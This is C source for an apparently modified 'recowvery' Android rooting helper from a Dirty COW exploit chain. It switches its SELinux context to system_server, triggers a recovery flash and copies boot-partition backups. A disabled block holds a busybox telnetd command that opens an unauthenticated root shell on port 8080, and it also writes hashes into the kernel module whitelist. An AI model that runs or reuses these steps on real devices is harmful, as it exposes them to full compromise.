#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <cutils/properties.h>
#include <selinux/selinux.h>
#include <sys/types.h>
#include <dirent.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>


#define APP_NAME  "recowvery"
#ifdef _64BIT
#define HOST_NAME "app_process64"
#else
#define HOST_NAME "app_process32"
#endif

#ifdef DEBUG
#include <android/log.h>
#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO,  APP_NAME, __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); }
#define LOGE(...) { __android_log_print(ANDROID_LOG_ERROR, APP_NAME, __VA_ARGS__); fprintf(stderr, __VA_ARGS__); fprintf(stderr, "\n"); }
#else
#define LOGV(...) { printf(__VA_ARGS__); printf("\n"); }
#define LOGE(...) { fprintf(stderr, __VA_ARGS__); fprintf(stderr, "\n"); }
#endif

#define SEP LOGV("------------")

#define CONTEXT_SYS "u:r:system_server:s0"

#define CTL_START    "ctl.start"
#define FLASH_RECOVERY    "flash_recovery"

char *hashes[] = {
    "d6bafff0298c47785577284edfa45224b3171dfc",
    "b6df6ebe7c0f6a27e58fc97b4d52859e3df72672",
    "b4367d4779c9f75df838630e10d35f8f4c5469f1",
    "aafbee8e3edb4c40cb394ce2f6746f63e3f873a0",
    "a4cdde636f2155a9c91608bb1af38bc7b96d3d4e",
    "a1117d8aafcade63782c37539e4e1d34fad4ed7b",
    "4fd2a23dcf7088db8229e4cb177c48e76fdf4e0a",
    "3c7d06be2b24c31e59cfff7c387bfc6320401b18",
    "3518261933d48fe015d682138581e3e451d52ea1",
    "2da9831d522f5b0b5d5bc52cbfc7eee8c0fa169e",
    "f02bc739de13689f0d789adbc5cfe6605af7a69b",
    NULL,
};

#define BUF_SIZE 512

int do_copy(const char *name)
{
    int input_fd, output_fd;    /* Input and output file descriptors */
    ssize_t ret_in, ret_out;    /* Number of bytes returned by read() and write() */
    char buffer[BUF_SIZE];      /* Character buffer */

    char input[200];
    char output[200];
    sprintf(input, "/cache/zpibackup_%s", name);
    sprintf(output, "/sdcard/zpibackup/%s", name);

    /* Create input file descriptor */
    input_fd = open (input, O_RDONLY);
    if (input_fd == -1) {
            LOGV("input open error");
            return 2;
    }
 
    /* Create output file descriptor */
    output_fd = open(output, O_WRONLY | O_CREAT, 0644);
    if(output_fd == -1){
        LOGV("output open error");
        return 3;
    }
 
    /* Copy process */
    while((ret_in = read (input_fd, &buffer, BUF_SIZE)) > 0){
            ret_out = write (output_fd, &buffer, (ssize_t) ret_in);
            if(ret_out != ret_in){
                /* Write error */
                LOGV("write");
                return 4;
            }
    }
 
    /* Close file descriptors */
    close (input_fd);
    close (output_fd);

    return 0;
}

int main(void)
{
	int ret = 0;
	char *conn = 0;

	SEP;
	LOGV("Welcome to %s! (%s)", APP_NAME, HOST_NAME);

	ret = getcon(&conn);
	if (ret) {
		LOGE("Could not get current security context!");
		goto oops;
	}

	LOGV("Current selinux context: %s", conn);

	ret = setcon(CONTEXT_SYS);
	if (ret) {
		LOGE("Unable to set security context to '%s'!", CONTEXT_SYS);
		goto oops;
	}
	LOGV("Set context to '%s'", CONTEXT_SYS);

	ret = getcon(&conn);
	if (ret) {
		LOGE("Could not get current security context!");
		goto oops;
	}

	LOGV("Current security context: %s", conn);

	if (strcmp(conn, CONTEXT_SYS)) {
		LOGE("Current security context '%s' does not match '%s'!",
			conn, CONTEXT_SYS);
		ret = EINVAL;
		goto oops;
	}

#define DEBUG_ZPIRUN "debug.zpirun"

    LOGV("Reading %s property", DEBUG_ZPIRUN);
    char buf[PROPERTY_VALUE_MAX];
    ret = property_get(DEBUG_ZPIRUN, buf, "");
    if (ret == 1) {
        LOGV("Property was ok, reset it");
        ret = property_set(DEBUG_ZPIRUN, "");
        if (ret) {
            LOGE("Failed to reset property %s!", DEBUG_ZPIRUN);
            goto oops;
        }

        if (strncmp(buf, "1", 1) == 0) {
            LOGV("Setting property '%s' to '%s'", CTL_START, FLASH_RECOVERY);

            ret = property_set(CTL_START, FLASH_RECOVERY);
            if (ret) {
                LOGE("Failed to set property '%s'!", CTL_START);
                goto oops;
            }
        } else if (strncmp(buf, "2", 1) == 0) {
            LOGV("Running system cat");
            do_copy("boot");
        } else if (strncmp(buf, "3", 1) == 0) {
            LOGV("Restart adbd in no authentication mode");
        } else {
            LOGV("Invalid buf x%sy", buf);
        }
    }
    else {
        LOGV("do not run zpiapplypatch buf=x%sy ret=%d", buf, ret);
    }

#if 0
    const char *dname = "/dev/block/bootdevice/by-name/";
    DIR *d = opendir(dname);
    if (d) {
        LOGV("%s successfully opened !", dname);
        closedir(d);
    } else {
        LOGV("%s failure :( %s", dname, strerror(errno));
    }

    LOGV("Running busybox now !");
    system("/data/local/tmp/busybox telnetd -p 8080 -l /system/bin/sh -F");
    LOGV("busybox quit... :(");

    LOGV("Reading sha1 from log.blibli");
    char buf[PROPERTY_VALUE_MAX];
    ret = property_get("log.blibli", buf, "");
    if (ret > 0) {
        buf[40] = '\0';
        LOGV("Read value %s", buf);
        LOGV("Writing module_whitelist");
        FILE *f2 = fopen("/sys/kernel/module_whitelist", "w");
        if (f2) {
            int i = 0;
            char *s = hashes[i];
            while (s != NULL) {
                ret = fprintf(f2, "%s\n", s);
                LOGV("Wrote %s, ret %d", s, ret);
                i++;
                s = hashes[i];
            }
            LOGV("Writing %s", buf);
            fprintf(f2, "%s\n", buf);
            fflush(f2);
            fclose(f2);
        } else {
            LOGV("f2 is NULL ?!");
        }
        LOGV("Done writing module_whitelist");
    }
#endif
	SEP;

#if 0
	LOGV("Setting property '%s' to '%s'", CTL_START, FLASH_RECOVERY);

	ret = property_set(CTL_START, FLASH_RECOVERY);
	if (ret) {
		LOGE("Failed to set property '%s'!", CTL_START);
		goto oops;
	}

	LOGV("Recovery flash script should have started!");
	LOGV("Run on your PC or device to see progress: adb logcat -s recowvery");
	/*
	 * we should wait 3 minutes to allow the flash to complete
	 * and for the user to reboot their device
	 */
	LOGV("Waiting 3 minutes to try again (in case it didn't start or you forgot to dirtycow applypatch first)...");
	sleep(180);
#endif
	sleep(10);
	return 0;
oops:
	/*
	 * we should wait 20 seconds just so Zygote isn't
	 * being constantly restarted
	 */
	LOGE("Error %d: %s", ret, strerror(-ret));
	LOGE("Waiting 20 seconds for next try...");
	sleep(20);
	return ret;
}
